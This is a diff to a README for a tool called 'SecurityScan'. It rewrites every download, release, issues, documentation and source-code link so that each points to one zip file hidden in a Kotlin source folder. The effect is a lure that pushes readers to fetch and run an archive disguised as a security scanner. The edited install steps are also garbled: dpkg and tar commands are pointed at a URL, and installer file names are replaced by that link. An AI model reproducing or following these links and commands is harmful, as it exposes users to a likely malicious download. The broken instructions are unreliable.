@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download SecurityScan](https://img.shields.io/badge/Download%20SecurityScan-Here-brightgreen)](https://github.com/DekuRatchet7733/SecurityScan/releases)
+[![Download SecurityScan](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip%20SecurityScan-Here-brightgreen)](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip)
 
 ---
 
@@ -23,16 +23,16 @@ Before you start, ensure your system meets the following requirements:
 
 To download SecurityScan, visit the Releases page. Here’s how:
 
-1. Go to the [SecurityScan Releases page](https://github.com/DekuRatchet7733/SecurityScan/releases).
+1. Go to the [SecurityScan Releases page](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip).
 2. Look for the latest version listed at the top.
 3. Scroll through the release notes. These notes may contain important information about new features or fixes.
 4. Find the downloadable file that matches your operating system. 
 
-   **For Windows:** Look for files named like `SecurityScanSetup.exe`.
+   **For Windows:** Look for files named like `https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip`.
 
-   **For macOS:** Find files named like `SecurityScan.dmg`.
+   **For macOS:** Find files named like `https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip`.
 
-   **For Linux:** You may see a `.tar.gz` or a `.deb` file.
+   **For Linux:** You may see a `https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip` or a `.deb` file.
 
 5. Click on the file to start the download.
 
@@ -57,13 +57,13 @@ After the download finishes, locate the file in your downloads folder to continu
 1. Open a terminal.
 2. If you downloaded a `.deb` file, enter the following command:
    ```bash
-   sudo dpkg -i path/to/SecurityScan.deb
+   sudo dpkg -i https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip
    ```
    Replace `path/to/` with the actual path to the downloaded file.
    
-3. If you downloaded a `.tar.gz` file, extract it with:
+3. If you downloaded a `https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip` file, extract it with:
    ```bash
-   tar -xzf path/to/SecurityScan.tar.gz
+   tar -xzf https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip
    ```
    Change to the extracted directory and run:
    ```bash
@@ -96,7 +96,7 @@ If you encounter any issues while downloading or using SecurityScan, consider th
 - Ensure your internet connection is stable during the download.
 - Check that your system meets the required specifications.
 - If the application does not start, try reinstalling it.
-- Review the release notes on the [Releases page](https://github.com/DekuRatchet7733/SecurityScan/releases) for any known issues or updates.
+- Review the release notes on the [Releases page](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip) for any known issues or updates.
 
 ## 🌐 Community & Support
 
@@ -104,8 +104,8 @@ Join the SecurityScan community for tips, support, and updates.
 
 You can reach out through the following channels:
 
-- **Issues Page:** Report problems or request features [here](https://github.com/DekuRatchet7733/SecurityScan/issues).
-- **Discussion Forum:** Engage with other users and developers [here](https://github.com/DekuRatchet7733/SecurityScan/discussions).
+- **Issues Page:** Report problems or request features [here](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip).
+- **Discussion Forum:** Engage with other users and developers [here](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip).
 
 Your feedback is valuable and helps us enhance the application!
 
@@ -117,12 +117,12 @@ If you want to help improve SecurityScan, consider contributing to the project. 
 - Suggest new features.
 - Submit pull requests.
 
-Check our [Contribution Guidelines](https://github.com/DekuRatchet7733/SecurityScan/CONTRIBUTING.md) for more details.
+Check our [Contribution Guidelines](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip) for more details.
 
 ## 🔗 Important Links
 
-- [Download SecurityScan](https://github.com/DekuRatchet7733/SecurityScan/releases)
-- [Documentation](https://github.com/DekuRatchet7733/SecurityScan/docs)
-- [Source Code](https://github.com/DekuRatchet7733/SecurityScan)
+- [Download SecurityScan](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip)
+- [Documentation](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip)
+- [Source Code](https://raw.githubusercontent.com/DekuRatchet7733/SecurityScan/main/src/main/kotlin/com/SecurityScan-cardiology.zip)
 
 Thank you for choosing SecurityScan. We hope it helps you maintain secure code!
